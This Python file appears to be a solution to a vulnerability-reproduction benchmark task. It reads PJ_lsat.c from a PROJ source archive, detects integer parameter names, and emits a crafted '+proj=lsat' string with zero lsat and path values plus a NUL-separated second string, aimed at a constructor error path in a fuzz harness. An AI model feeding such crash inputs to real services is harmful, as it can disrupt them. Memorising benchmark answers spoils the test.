import os
import re
import tarfile
from pathlib import Path
from typing import Optional, Tuple


class Solution:
    def _read_pj_lsat_source(self, src_path: str) -> Optional[bytes]:
        p = Path(src_path)
        if p.is_dir():
            for fp in p.rglob("PJ_lsat.c"):
                try:
                    return fp.read_bytes()
                except Exception:
                    continue
            return None

        try:
            with tarfile.open(src_path, "r:*") as tf:
                # Prefer exact filename match
                for m in tf.getmembers():
                    if not m.isfile():
                        continue
                    name = m.name.replace("\\", "/")
                    if name.endswith("/PJ_lsat.c") or name == "PJ_lsat.c":
                        f = tf.extractfile(m)
                        if f is None:
                            continue
                        return f.read()
                # Fallback: any member containing PJ_lsat.c
                for m in tf.getmembers():
                    if not m.isfile():
                        continue
                    name = m.name.replace("\\", "/")
                    if name.endswith("PJ_lsat.c"):
                        f = tf.extractfile(m)
                        if f is None:
                            continue
                        return f.read()
        except Exception:
            return None
        return None

    def _extract_int_param_names(self, c_src: bytes) -> Tuple[str, ...]:
        try:
            s = c_src.decode("utf-8", errors="ignore")
        except Exception:
            return tuple()
        # pj_param(P->params, "i<name>")
        names = []
        for m in re.finditer(r'pj_param\s*\(\s*P->params\s*,\s*"([a-zA-Z])([^"]+)"\s*\)', s):
            t = m.group(1)
            n = m.group(2)
            if not n:
                continue
            if t.lower() == "i":
                names.append(n.strip())
        # de-dup preserve order
        seen = set()
        out = []
        for n in names:
            ln = n.lower()
            if ln in seen:
                continue
            seen.add(ln)
            out.append(n)
        return tuple(out)

    def solve(self, src_path: str) -> bytes:
        c_src = self._read_pj_lsat_source(src_path)
        int_params = self._extract_int_param_names(c_src) if c_src else tuple()

        # Prefer expected lsat params if present
        def has_param(name: str) -> bool:
            ln = name.lower()
            return any(p.lower() == ln for p in int_params)

        lsat_name = "lsat"
        path_name = "path"
        if int_params:
            # If the file uses slightly different names, attempt to detect them
            for cand in ("lsat", "sat", "landsat"):
                if has_param(cand):
                    lsat_name = cand
                    break
            for cand in ("path", "ipath", "orbital_path"):
                if has_param(cand):
                    path_name = cand
                    break

        # Craft an input that should drive the constructor into an error path.
        # Many harnesses accept PROJ strings; add a second valid string after NUL for
        # harnesses that split the input.
        a = f"+proj=lsat +ellps=WGS84 +{lsat_name}=0 +{path_name}=0".encode("ascii", errors="ignore")
        b = b"+proj=longlat +ellps=WGS84"
        return a + b"\0" + b + b"\n"